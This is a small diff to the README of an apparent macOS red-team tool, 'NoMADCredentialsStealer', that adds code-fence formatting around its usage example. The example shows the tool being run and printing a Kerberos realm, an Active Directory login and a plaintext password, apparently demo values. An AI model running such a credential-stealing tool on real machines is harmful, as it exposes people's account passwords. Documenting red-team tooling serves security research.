@@ -3,6 +3,7 @@ https://wojciechregula.blog/post/macos-red-teaming-get-ad-credentials-from-nomad
 
 ### Usage
 
+```sh
 $ ./NoMADCredentialsStealer.app/Contents/MacOS/NoMADCredentialsStealer
 $
 +-------------------------------+
@@ -14,3 +15,4 @@ $
 +> Kerberos realm -> WOJCIECHREGULA.BLOG
 +> AD login -> wregula@WOJCIECHREGULA.BLOG
 +> AD password -> Passw0rd
+```
